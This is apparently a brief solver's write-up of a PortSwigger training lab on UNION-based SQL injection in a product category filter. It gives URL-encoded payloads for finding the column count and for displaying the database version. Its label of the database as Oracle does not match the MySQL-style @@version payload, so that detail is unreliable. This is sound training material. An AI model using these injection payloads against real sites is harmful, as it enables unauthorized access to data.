This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

we need to know number of column so we use **order by** 

%27+order+by+2 --

when try 3 we get an error so number of column is 2 

now try use union attack to display version of **Oracle** 

'+UNION+SELECT+@@version,+NULL%23

- we get query from sql injection cheat sheet :)


![](https://cdn-images-1.medium.com/max/1000/1*9tZuz8PbnGG06qQjMTu9uw.png)

![](https://cdn-images-1.medium.com/max/1000/1*QjmixxjFxDmKNHexCxQRsg.png)